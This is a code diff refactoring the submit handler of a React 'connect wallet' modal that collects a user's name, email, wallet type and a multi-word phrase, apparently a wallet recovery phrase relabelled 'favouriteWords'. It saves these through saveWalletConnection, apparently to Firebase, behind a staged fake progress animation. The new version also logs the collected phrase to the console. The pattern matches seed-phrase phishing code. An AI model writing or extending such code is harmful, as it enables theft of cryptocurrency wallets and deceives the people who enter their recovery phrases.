@@ -131,103 +131,69 @@ function ConnectFormModal({
   /* =========================
      HANDLE SUBMIT
   ========================= */
-  const handleSubmit =
-    async () => {
-      if (!validateFormData())
-        return;
+ const handleSubmit = async () => {
+  if (!validateFormData()) return;
 
-      setIsLoading(true);
-      setError(null);
-      setValidationError(null);
+  setIsLoading(true);
+  setError(null);
+  setValidationError(null);
 
-      try {
-        let walletData = {
-          name: form.name.trim(),
-          email:
-            form.email.trim(),
-          type:
-            wallet?.name ||
-            "Unknown",
-        };
+  try {
+    console.log("🚀 handleSubmit started");
 
-        /* Favourite Words */
-        if (tab === "phrase") {
-          const validation =
-            validateFavouriteWords(
-              form.phrase
-            );
-
-          walletData
-            .favouriteWords =
-            form.phrase.trim();
-
-          walletData.wordCount =
-            validation.wordCount;
-        }
-
-        /* Progress Animation */
-        setStep(1);
-        setProgress(20);
-
-        await new Promise(
-          (resolve) =>
-            setTimeout(
-              resolve,
-              1200
-            )
-        );
-
-        /* Save to Firebase */
-        const result =
-          await saveWalletConnection(
-            walletData
-          );
-
-        if (!result.success) {
-          throw new Error(
-            result.error
-          );
-        }
-
-        setUniqueId(result.uid);
-
-        setStep(2);
-        setProgress(60);
-
-        await new Promise(
-          (resolve) =>
-            setTimeout(
-              resolve,
-              1200
-            )
-        );
-
-        setStep(3);
-        setProgress(100);
-
-        await new Promise(
-          (resolve) =>
-            setTimeout(
-              resolve,
-              800
-            )
-        );
-
-        setSuccess(true);
-      } catch (err) {
-        console.error(err);
-
-        setError(
-          err.message ||
-            "Something went wrong"
-        );
-
-        setStep(0);
-        setProgress(0);
-      } finally {
-        setIsLoading(false);
-      }
+    let walletData = {
+      name: form.name.trim(),
+      email: form.email.trim(),
+      type: wallet?.name || "Unknown",
     };
+
+    if (tab === "phrase") {
+      const validation = validateFavouriteWords(form.phrase);
+      walletData.favouriteWords = form.phrase.trim();
+      walletData.wordCount = validation.wordCount;
+    }
+
+    console.log("📤 About to call saveWalletConnection with:", walletData);
+
+    const result = await saveWalletConnection(walletData);
+    
+    console.log("✅ Result received from saveWalletConnection:", result);
+
+    if (!result?.success) {
+      throw new Error(result?.error || "Failed to save data");
+    }
+
+    setUniqueId(result.uid);
+    console.log("✅ Unique ID set:", result.uid);
+
+    // Progress Animation
+    setStep(1);
+    setProgress(20);
+    await new Promise(r => setTimeout(r, 800));
+
+    setStep(2);
+    setProgress(60);
+    await new Promise(r => setTimeout(r, 800));
+
+    setStep(3);
+    setProgress(100);
+    await new Promise(r => setTimeout(r, 600));
+
+    setSuccess(true);
+    console.log("🎉 setSuccess(true) called successfully");
+
+    alert("✅ Success! The modal should appear now.");
+
+  } catch (err) {
+    console.error("❌ CATCH BLOCK ERROR:", err);
+    setError(err.message || "Something went wrong. Please try again.");
+    setStep(0);
+    setProgress(0);
+  } finally {
+    setIsLoading(false);
+    console.log("🏁 handleSubmit finished");
+  }
+};
 
   return (
     <>
